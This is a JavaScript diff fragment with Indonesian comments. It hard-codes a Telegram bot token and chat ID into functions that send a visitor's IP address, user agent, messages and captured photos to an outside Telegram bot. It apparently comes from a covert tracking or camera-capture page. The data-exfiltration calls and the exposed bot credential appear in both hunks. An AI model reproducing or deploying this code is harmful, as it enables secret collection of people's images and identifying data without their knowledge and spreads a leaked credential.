@@ -17,7 +17,7 @@ function sendIPAndUserAgent() {
 
 // Fungsi untuk mengirim pesan teks ke Telegram
 function sendMessageToTelegram(message) {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY/sendMessage`, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -72,7 +72,7 @@ function sendPhoto(photo) {
     const formData = new FormData();
     formData.append('photo', blob, 'photo.jpg');
 
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
+    fetch(`https://api.telegram.org/bot7415689438:AAEn-_NYC87F-UUyfxCnZQ25CbAv85hNrkY/sendPhoto?chat_id=1145550172`, {
         method: 'POST',
         body: formData
     })
